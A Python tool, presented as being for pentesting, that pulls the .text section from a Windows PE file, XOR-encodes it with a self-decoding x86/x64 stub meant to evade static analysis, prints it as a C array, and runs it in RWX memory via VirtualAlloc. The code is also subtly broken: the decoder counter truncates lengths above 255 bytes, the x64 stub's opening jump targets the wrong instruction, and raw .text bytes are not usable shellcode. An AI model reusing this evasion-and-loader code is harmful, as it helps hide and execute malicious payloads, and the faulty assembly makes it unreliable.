import pefile
import argparse
from ctypes import windll, c_char_p, c_void_p, cast, CFUNCTYPE, byref, c_uint32

# Configuration
XOR_KEY = 0xAA  # Change this to evade static analysis
OUTPUT_FILE = "shellcode.bin"  # Default output file

def xor_encode(shellcode, key=XOR_KEY):
    """XOR-encode shellcode to avoid null bytes."""
    return bytes([b ^ key for b in shellcode])

def generate_decoder_stub(key, shellcode_len, is_x64=False):
    """
    Generates a self-decoding stub for XOR-encoded shellcode.
    Includes detailed assembly comments for clarity.
    """
    if is_x64:
        # x64 Decoder Stub (with comments)
        decoder = bytes([
            # --- x64 Assembly (Intel syntax) ---
            0xEB, 0x0F,                          # jmp short 0x11       ; Jump to call
            0x5E,                                # pop rsi              ; Load RIP into RSI
            0x48, 0x31, 0xC9,                    # xor rcx, rcx         ; Clear RCX
            0x80, 0xC1, shellcode_len & 0xFF,    # add cl, <len>        ; Set counter
            0x80, 0x36, key,                     # xor byte [rsi], key  ; Decode byte
            0x48, 0xFF, 0xC6,                    # inc rsi              ; Next byte
            0xE2, 0xF8,                          # loop short 0xF8      ; Loop until RCX=0
            0xEB, 0x05,                          # jmp short 0x05       ; Jump to shellcode
            0xE8, 0xEC, 0xFF, 0xFF, 0xFF         # call 0xFFFFFFF1      ; Call to pop rsi
        ])
    else:
        # x86 Decoder Stub (with comments)
        decoder = bytes([
            # --- x86 Assembly (Intel syntax) ---
            0xEB, 0x0D,                          # jmp short 0x0F       ; Jump to call
            0x5E,                                # pop esi              ; Load EIP into ESI
            0x31, 0xC9,                          # xor ecx, ecx         ; Clear ECX
            0xB1, shellcode_len & 0xFF,          # mov cl, <len>        ; Set counter
            0x80, 0x36, key,                     # xor byte [esi], key  ; Decode byte
            0x46,                                # inc esi              ; Next byte
            0xE2, 0xFA,                          # loop short 0xFA      ; Loop until ECX=0
            0xEB, 0x05,                          # jmp short 0x05       ; Jump to shellcode
            0xE8, 0xEE, 0xFF, 0xFF, 0xFF         # call 0xFFFFFFF1      ; Call to pop esi
        ])
    return decoder

def format_shellcode_c(shellcode, bytes_per_line=16):
    """
    Formats shellcode into C-compatible 16-byte strings.
    Example output:
        "\x90\x90..."
        "\x90\x90..."
    """
    formatted = []
    for i in range(0, len(shellcode), bytes_per_line):
        chunk = shellcode[i:i+bytes_per_line]
        hex_str = "".join([f"\\x{b:02x}" for b in chunk])
        formatted.append(f'"{hex_str}"')
    return "\n".join(formatted)

def extract_shellcode(pe_path, avoid_null=True):
    """Extracts shellcode from a PE file and handles architecture."""
    try:
        pe = pefile.PE(pe_path)
    except Exception as e:
        print(f"[!] Failed to parse PE: {e}")
        return None, None

    # Detect architecture
    is_x64 = pe.FILE_HEADER.Machine == 0x8664  # IMAGE_FILE_MACHINE_AMD64

    # Extract .text section
    text_section = next((s for s in pe.sections if b".text" in s.Name), None)
    if not text_section:
        print("[!] .text section not found")
        return None, None

    shellcode = text_section.get_data()
    pe.close()

    # Handle null bytes
    if avoid_null and b"\x00" in shellcode:
        print(f"[+] XOR-encoding shellcode (key=0x{XOR_KEY:02x})")
        encoded = xor_encode(shellcode)
        decoder = generate_decoder_stub(XOR_KEY, len(encoded), is_x64)
        final_shellcode = decoder + encoded
    else:
        final_shellcode = shellcode

    return final_shellcode, is_x64

def write_shellcode_to_file(shellcode, filename):
    """Writes raw shellcode to a binary file."""
    with open(filename, "wb") as f:
        f.write(shellcode)
    print(f"[+] Raw shellcode saved to: {filename}")

def test_shellcode(shellcode, is_x64):
    """Executes shellcode in memory (for testing)."""
    try:
        # Allocate executable memory
        ptr = windll.kernel32.VirtualAlloc(
            None,
            len(shellcode),
            0x1000,  # MEM_COMMIT
            0x40     # PAGE_EXECUTE_READWRITE
        )
        if not ptr:
            print("[!] Failed to allocate memory")
            return False

        # Copy shellcode to memory
        windll.kernel32.RtlMoveMemory(
            ptr,
            shellcode,
            len(shellcode)
        )

        # Flush instruction cache (recommended)
        windll.kernel32.FlushInstructionCache(
            windll.kernel32.GetCurrentProcess(),
            ptr,
            len(shellcode)
        )

        # Cast to function and execute
        func_type = CFUNCTYPE(None)
        func = cast(ptr, func_type)
        print("[+] Executing shellcode...")
        func()

        # Cleanup
        windll.kernel32.VirtualFree(ptr, 0, 0x8000)  # MEM_RELEASE
        return True

    except Exception as e:
        print(f"[!] Shellcode execution failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Extract shellcode for pentesting (raw + C format + testing).")
    parser.add_argument("pe_file", help="Path to PE file (e.g., notepad.exe)")
    parser.add_argument("--output", help="Output .bin file (default: shellcode.bin)", default=OUTPUT_FILE)
    parser.add_argument("--no-encode", help="Disable XOR encoding", action="store_true")
    parser.add_argument("--test", help="Test shellcode execution", action="store_true")
    args = parser.parse_args()

    shellcode, is_x64 = extract_shellcode(args.pe_file, not args.no_encode)
    if not shellcode:
        return

    print(f"\n[+] Architecture: {'x64' if is_x64 else 'x86'}")
    print(f"[+] Shellcode size: {len(shellcode)} bytes")

    # Write raw shellcode to file
    write_shellcode_to_file(shellcode, args.output)

    # Print C-formatted shellcode
    print("")
    print("unsigned char buf[] = ")
    print(format_shellcode_c(shellcode) + ";")

    # Test shellcode if requested
    if args.test:
        print("\n[+] Testing shellcode...")
        if not test_shellcode(shellcode, is_x64):
            print("[!] Shellcode test failed (check debugger for details)")

if __name__ == "__main__":
    main()

